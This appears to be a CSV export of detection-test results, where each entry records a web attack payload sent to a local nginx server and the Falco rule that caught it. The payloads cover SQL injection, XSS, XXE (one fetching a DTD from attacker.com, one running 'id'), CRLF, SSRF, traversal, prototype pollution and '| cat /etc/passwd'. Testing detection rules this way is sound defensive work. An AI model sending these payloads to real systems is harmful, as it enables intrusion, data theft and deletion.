"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CRLF_HDR_001` |
| **Name** | Cookie Header Injection via CRLF |
| **Category** | CRLF |
| **Subcategory** | header_injection |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `\r\nSet-Cookie:hacked=true`
- **Encoded**: `%0d%0aSet-Cookie%3Ahacked%3Dtrue`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~4000ms
- **Timestamp**: 13:55:08.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CRLF] CRLF Injection attempt detected` |
| **Matched Rule** | `[NGINX CRLF] CRLF Injection attempt detected test_id=CRLF_HDR_001-1770818108388-hqsw4k pattern_id=CRLF_HDR_001 uri=/?q=%0d%0aSet-Cookie%3Ahacked%3Dtrue client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CRLF] CRLF Injection attempt detected test_id=CRLF_HDR_001-1770818108388-hqsw4k pattern_id=CRLF_HDR_001 uri=/?q=%0d%0aSet-Cookie%3Ahacked%3Dtrue client=127.0.0.1

**Falco Log Entry**:
```
13:55:08.000000000: Warning [NGINX CRLF] CRLF Injection attempt detected test_id=CRLF_HDR_001-1770818108388-hqsw4k pattern_id=CRLF_HDR_001 uri=/?q=%0d%0aSet-Cookie%3Ahacked%3Dtrue client=127.0.0.1
```","1","test_e2e_with_logs[422_CRLF_HDR_001]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_ERROR_008` |
| **Name** | MySQL GTID_SUBSET error injection |
| **Category** | SQLI |
| **Subcategory** | error_based |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `' AND GTID_SUBSET(version(),1) --`
- **Encoded**: `%27%20AND%20GTID_SUBSET%28version%28%29%2C1%29%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~59000ms
- **Timestamp**: 13:54:13.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XPath Injection] XPath injection attempt` |
| **Matched Rule** | `[NGINX XPath Injection] XPath injection attempt test_id=SQLI_ERROR_008-1770818053949-y6r2nm pattern_id=SQLI_ERROR_008 uri=/?q=%27%20AND%20GTID_SUBSET%28version%28%29%2C1%29%20-- client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XPath Injection] XPath injection attempt test_id=SQLI_ERROR_008-1770818053949-y6r2nm pattern_id=SQLI_ERROR_008 uri=/?q=%27%20AND%20GTID_SUBSET%28version%28%29%2C1%29%20-- client=127.0.0.1

**Falco Log Entry**:
```
13:54:13.000000000: Warning [NGINX XPath Injection] XPath injection attempt test_id=SQLI_ERROR_008-1770818053949-y6r2nm pattern_id=SQLI_ERROR_008 uri=/?q=%27%20AND%20GTID_SUBSET%28version%28%29%2C1%29%20-- client=127.0.0.1
```","2","test_e2e_with_logs[069_SQLI_ERROR_008]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XXE_ENTITY_003` |
| **Name** | XXE expect wrapper command execution |
| **Category** | XXE |
| **Subcategory** | entity_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `<!ENTITY xxe SYSTEM ""expect://id"">`
- **Encoded**: `%3C!ENTITY%20xxe%20SYSTEM%20%22expect%3A%2F%2Fid%22%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~53000ms
- **Timestamp**: 13:54:19.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection` |
| **Matched Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_ENTITY_003-1770818059390-4o667 pattern_id=XXE_ENTITY_003 uri=/?q=%3C!ENTITY%20xxe%20SYSTEM%20%22expect%3A%2F%2Fid%22%3E client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_ENTITY_003-1770818059390-4o667 pattern_id=XXE_ENTITY_003 uri=/?q=%3C!ENTITY%20xxe%20SYSTEM%20%22expect%3A%2F%2Fid%22%3E client=127.0.0.1

**Falco Log Entry**:
```
13:54:19.000000000: Critical [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_ENTITY_003-1770818059390-4o667 pattern_id=XXE_ENTITY_003 uri=/?q=%3C!ENTITY%20xxe%20SYSTEM%20%22expect%3A%2F%2Fid%22%3E client=127.0.0.1
```","1","test_e2e_with_logs[416_XXE_ENTITY_003]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_REFL_012` |
| **Name** | onclick event handler injection |
| **Category** | XSS |
| **Subcategory** | reflected_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<div onclick=alert(1)>click</div>`
- **Encoded**: `%3Cdiv%20onclick%3Dalert(1)%3Eclick%3C%2Fdiv%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~74000ms
- **Timestamp**: 13:53:58.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] Polyglot XSS Attack` |
| **Matched Rule** | `[NGINX XSS] Polyglot XSS Attack test_id=XSS_REFL_012-1770818038904-o5sr0f pattern_id=XSS_REFL_012 uri=/?q=%3Cdiv%20onclick%3Dalert(1)%3Eclick%3C%2Fdiv%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] Polyglot XSS Attack test_id=XSS_REFL_012-1770818038904-o5sr0f pattern_id=XSS_REFL_012 uri=/?q=%3Cdiv%20onclick%3Dalert(1)%3Eclick%3C%2Fdiv%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:53:58.000000000: Critical [NGINX XSS] Polyglot XSS Attack test_id=XSS_REFL_012-1770818038904-o5sr0f pattern_id=XSS_REFL_012 uri=/?q=%3Cdiv%20onclick%3Dalert(1)%3Eclick%3C%2Fdiv%3E client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[197_XSS_REFL_012]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_DOM_004` |
| **Name** | innerHTML DOM XSS |
| **Category** | XSS |
| **Subcategory** | dom_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `innerHTML='<img src=x onerror=alert(""DOM"")>'`
- **Encoded**: `innerHTML%3D'%3Cimg%20src%3Dx%20onerror%3Dalert(%22DOM%22)%3E'`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~67000ms
- **Timestamp**: 13:54:05.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_004-1770818045919-bnv6zx pattern_id=XSS_DOM_004 uri=/?q=innerHTML%3D'%3Cimg%20src%3Dx%20onerror%3Dalert(%22DOM%22)%3E' client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_004-1770818045919-bnv6zx pattern_id=XSS_DOM_004 uri=/?q=innerHTML%3D'%3Cimg%20src%3Dx%20onerror%3Dalert(%22DOM%22)%3E' client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:54:05.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_004-1770818045919-bnv6zx pattern_id=XSS_DOM_004 uri=/?q=innerHTML%3D'%3Cimg%20src%3Dx%20onerror%3Dalert(%22DOM%22)%3E' client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[148_XSS_DOM_004]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_BASIC_004` |
| **Name** | Quadruple parent directory traversal |
| **Category** | PATH |
| **Subcategory** | basic_traversal |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `../../../../`
- **Encoded**: `../../../../`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~73000ms
- **Timestamp**: 13:53:59.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Basic path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Basic path traversal attack detected test_id=PATH_BASIC_004-1770818039891-grdu8l pattern_id=PATH_BASIC_004 uri=/?q=../../../../ client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_BASIC_004-1770818039891-grdu8l pattern_id=PATH_BASIC_004 uri=/?q=../../../../ client=127.0.0.1

**Falco Log Entry**:
```
13:53:59.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_BASIC_004-1770818039891-grdu8l pattern_id=PATH_BASIC_004 uri=/?q=../../../../ client=127.0.0.1
```","2","test_e2e_with_logs[232_PATH_BASIC_004]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XXE_ENTITY_002` |
| **Name** | XXE external DTD parameter entity |
| **Category** | XXE |
| **Subcategory** | entity_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `<!ENTITY % dtd SYSTEM ""http://attacker.com/evil.dtd"">`
- **Encoded**: `%3C!ENTITY%20%25%20dtd%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fevil.dtd%22%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~54000ms
- **Timestamp**: 13:54:18.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection` |
| **Matched Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_ENTITY_002-1770818058889-hu19a pattern_id=XXE_ENTITY_002 uri=/?q=%3C!ENTITY%20%25%20dtd%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fevil.dtd%22%3E client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_ENTITY_002-1770818058889-hu19a pattern_id=XXE_ENTITY_002 uri=/?q=%3C!ENTITY%20%25%20dtd%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fevil.dtd%22%3E client=127.0.0.1

**Falco Log Entry**:
```
13:54:18.000000000: Critical [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_ENTITY_002-1770818058889-hu19a pattern_id=XXE_ENTITY_002 uri=/?q=%3C!ENTITY%20%25%20dtd%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fevil.dtd%22%3E client=127.0.0.1
```","2","test_e2e_with_logs[415_XXE_ENTITY_002]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BOOL_017` |
| **Name** | Base64 encoded boolean injection |
| **Category** | SQLI |
| **Subcategory** | boolean_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `JyBPUiAnMSc9JzE%3D`
- **Encoded**: `JyBPUiAnMSc9JzE%253D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~31000ms
- **Timestamp**: 13:54:41.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_017-1770818081016-6otb3n pattern_id=SQLI_BOOL_017 uri=/?q=JyBPUiAnMSc9JzE%253D client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_017-1770818081016-6otb3n pattern_id=SQLI_BOOL_017 uri=/?q=JyBPUiAnMSc9JzE%253D client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:54:41.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_017-1770818081016-6otb3n pattern_id=SQLI_BOOL_017 uri=/?q=JyBPUiAnMSc9JzE%253D client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[048_SQLI_BOOL_017]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PP_JSON_001` |
| **Name** | JSON __proto__ Pollution |
| **Category** | PROTOTYPE_POLLUTION |
| **Subcategory** | json |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `{""__proto__"":{""polluted"":true}}`
- **Encoded**: `%7B%22__proto__%22%3A%7B%22polluted%22%3Atrue%7D%7D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~16000ms
- **Timestamp**: 13:54:56.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX PP] Prototype pollution attack attempt` |
| **Matched Rule** | `[NGINX PP] Prototype pollution attack attempt test_id=PP_JSON_001-1770818096897-55ghub pattern_id=PP_JSON_001 uri=/?q=%7B%22__proto__%22%3A%7B%22polluted%22%3Atrue%7D%7D client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX PP] Prototype pollution attack attempt test_id=PP_JSON_001-1770818096897-55ghub pattern_id=PP_JSON_001 uri=/?q=%7B%22__proto__%22%3A%7B%22polluted%22%3Atrue%7D%7D client=127.0.0.1

**Falco Log Entry**:
```
13:54:56.000000000: Warning [NGINX PP] Prototype pollution attack attempt test_id=PP_JSON_001-1770818096897-55ghub pattern_id=PP_JSON_001 uri=/?q=%7B%22__proto__%22%3A%7B%22polluted%22%3Atrue%7D%7D client=127.0.0.1
```","1","test_e2e_with_logs[437_PP_JSON_001]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SSRF_INT_001` |
| **Name** | Internal Redis Service Access |
| **Category** | SSRF |
| **Subcategory** | internal_service |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `http://localhost:6379/`
- **Encoded**: `http%3A%2F%2Flocalhost%3A6379%2F`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~8000ms
- **Timestamp**: 13:55:04.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SSRF] SSRF attack attempt detected` |
| **Matched Rule** | `[NGINX SSRF] SSRF attack attempt detected test_id=SSRF_INT_001-1770818104893-l8uwc pattern_id=SSRF_INT_001 uri=/?q=http%3A%2F%2Flocalhost%3A6379%2F client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SSRF] SSRF attack attempt detected test_id=SSRF_INT_001-1770818104893-l8uwc pattern_id=SSRF_INT_001 uri=/?q=http%3A%2F%2Flocalhost%3A6379%2F client=127.0.0.1

**Falco Log Entry**:
```
13:55:04.000000000: Critical [NGINX SSRF] SSRF attack attempt detected test_id=SSRF_INT_001-1770818104893-l8uwc pattern_id=SSRF_INT_001 uri=/?q=http%3A%2F%2Flocalhost%3A6379%2F client=127.0.0.1
```","2","test_e2e_with_logs[428_SSRF_INT_001]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_ADV_063` |
| **Name** | Pipe Cat Passwd |
| **Category** | CMDINJ |
| **Subcategory** | advanced |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `| cat /etc/passwd`
- **Encoded**: `%7C%20cat%20%2Fetc%2Fpasswd`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~38000ms
- **Timestamp**: 13:54:34.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command injection via pipe` |
| **Matched Rule** | `[NGINX CMDi] Command injection via pipe test_id=CMD_ADV_063-1770818074469-q5m99 pattern_id=CMD_ADV_063 uri=/?q=%7C%20cat%20%2Fetc%2Fpasswd client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command injection via pipe test_id=CMD_ADV_063-1770818074469-q5m99 pattern_id=CMD_ADV_063 uri=/?q=%7C%20cat%20%2Fetc%2Fpasswd client=127.0.0.1

**Falco Log Entry**:
```
13:54:34.000000000: Critical [NGINX CMDi] Command injection via pipe test_id=CMD_ADV_063-1770818074469-q5m99 pattern_id=CMD_ADV_063 uri=/?q=%7C%20cat%20%2Fetc%2Fpasswd client=127.0.0.1
```","1","test_e2e_with_logs[286_CMD_ADV_063]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_TIME_016` |
| **Name** | MySQL BENCHMARK with large iterations |
| **Category** | SQLI |
| **Subcategory** | time_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `BENCHMARK(10000000,MD5('a'))`
- **Encoded**: `BENCHMARK(10000000%2CMD5('a'))`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~75000ms
- **Timestamp**: 13:53:57.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Time-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_016-1770818037911-5rogoo pattern_id=SQLI_TIME_016 uri=/?q=BENCHMARK(10000000%2CMD5('a')) client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_016-1770818037911-5rogoo pattern_id=SQLI_TIME_016 uri=/?q=BENCHMARK(10000000%2CMD5('a')) client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:53:57.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_016-1770818037911-5rogoo pattern_id=SQLI_TIME_016 uri=/?q=BENCHMARK(10000000%2CMD5('a')) client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[111_SQLI_TIME_016]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_ADV_088` |
| **Name** | DELETE FROM Injection |
| **Category** | SQLI |
| **Subcategory** | advanced |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `DELETE FROM users WHERE 1=1`
- **Encoded**: `DELETE%20FROM%20users%20WHERE%201%3D1`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~41000ms
- **Timestamp**: 13:54:31.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt` |
| **Matched Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_ADV_088-1770818071992-lhmvl2 pattern_id=SQLI_ADV_088 uri=/?q=DELETE%20FROM%20users%20WHERE%201%3D1 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_ADV_088-1770818071992-lhmvl2 pattern_id=SQLI_ADV_088 uri=/?q=DELETE%20FROM%20users%20WHERE%201%3D1 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:54:31.000000000: Warning [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_ADV_088-1770818071992-lhmvl2 pattern_id=SQLI_ADV_088 uri=/?q=DELETE%20FROM%20users%20WHERE%201%3D1 client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[014_SQLI_ADV_088]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_ERROR_014` |
| **Name** | PostgreSQL information schema enumeration |
| **Category** | SQLI |
| **Subcategory** | error_based |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' AND (1)=(SELECT COUNT(*) FROM information_schema.tables WHERE table_name LIKE '%user%') --`
- **Encoded**: `%27%20AND%20%281%29%3D%28SELECT%20COUNT%28%2A%29%20FROM%20information_schema.tables%20WHERE%20table_name%20LIKE%20%27%25user%25%27%29%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~33000ms
- **Timestamp**: 13:54:39.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_ERROR_014-1770818079511-uo2747 pattern_id=SQLI_ERROR_014 uri=/?q=%27%20AND%20%281%29%3D%28SELECT%20COUNT%28%2A%29%20FROM%20information_schema.tables%20WHERE%20table_name%20LIKE%20%27%25user%25%27%29%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_ERROR_014-1770818079511-uo2747 pattern_id=SQLI_ERROR_014 uri=/?q=%27%20AND%20%281%29%3D%28SELECT%20COUNT%28%2A%29%20FROM%20information_schema.tables%20WHERE%20table_name%20LIKE%20%27%25user%25%27%29%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:54:39.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_ERROR_014-1770818079511-uo2747 pattern_id=SQLI_ERROR_014 uri=/?q=%27%20AND%20%281%29%3D%28SELECT%20COUNT%28%2A%29%20FROM%20information_schema.tables%20WHERE%20table_name%20LIKE%20%27%25user%25%27%29%20-- client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[075_SQLI_ERROR_014]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_ORDER_001` |
| **Name** | ORDER BY Subquery Injection |
| **Category** | SQLI |
| **Subcategory** | order_by_injection |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `1 ORDER BY (SELECT 1 FROM information_schema.tables)--`
- **Encoded**: `1%20ORDER%20BY%20(SELECT%201%20FROM%20information_schema.tables)--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~23000ms
- **Timestamp**: 13:54:49.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_ORDER_001-1770818089037-uwu1o pattern_id=SQLI_ORDER_001 uri=/?q=1%20ORDER%20BY%20(SELECT%201%20FROM%20information_schema.tables)-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_ORDER_001-1770818089037-uwu1o pattern_id=SQLI_ORDER_001 uri=/?q=1%20ORDER%20BY%20(SELECT%201%20FROM%20information_schema.tables)-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:54:49.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_ORDER_001-1770818089037-uwu1o pattern_id=SQLI_ORDER_001 uri=/?q=1%20ORDER%20BY%20(SELECT%201%20FROM%20information_schema.tables)-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[084_SQLI_ORDER_001]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_2ND_002` |
| **Name** | Second-order boolean injection |
| **Category** | SQLI |
| **Subcategory** | second_order |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `user' OR '1'='1' --`
- **Encoded**: `user'%20OR%20'1'%3D'1'%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~66000ms
- **Timestamp**: 13:54:06.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_2ND_002-1770818046932-qfki0j pattern_id=SQLI_2ND_002 uri=/?q=user'%20OR%20'1'%3D'1'%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_2ND_002-1770818046932-qfki0j pattern_id=SQLI_2ND_002 uri=/?q=user'%20OR%20'1'%3D'1'%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:54:06.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_2ND_002-1770818046932-qfki0j pattern_id=SQLI_2ND_002 uri=/?q=user'%20OR%20'1'%3D'1'%20-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[002_SQLI_2ND_002]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
